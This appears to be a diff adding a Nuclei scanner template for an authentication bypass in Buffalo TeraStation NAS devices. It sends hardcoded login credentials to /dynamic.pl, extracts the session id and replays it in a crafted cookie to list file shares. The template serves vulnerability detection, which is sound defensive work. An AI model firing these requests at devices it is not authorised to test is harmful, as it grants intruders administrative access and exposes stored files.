@@ -1,0 +1,62 @@
+id: buffalo-terastation-auth-bypass
+
+info:
+  name: Buffalo TeraStation NAS Authentication Bypass
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Buffalo TeraStation NAS devices are vulnerable to an authentication bypass issue, allowing attackers to gain administrative privileges.
+  reference:
+    - https://www.exploit-db.com/exploits/51012
+
+variables:
+  username: "Jordan"
+  password: "Jordan"
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: login
+    method: POST
+    path:
+      - "/dynamic.pl"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "bufaction=verifyLogin&user={{username}}&password={{password}}"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "{\"sid\":\""
+          - "\"pageMode\":"
+    extractors:
+      - type: regex
+        name: session_id
+        internal: true
+        part: body
+        group: 1
+        regex:
+          - "{\\\"sid\\\":\\\"(\\w+)\\\""
+
+  - id: get-share-list
+    method: POST
+    path:
+      - "/dynamic.pl"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+      Cookie: "webui_session_Jordan={{session_id}}_en_0"
+    body: "bufaction=getShareAllList"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "{\"success\":true,"
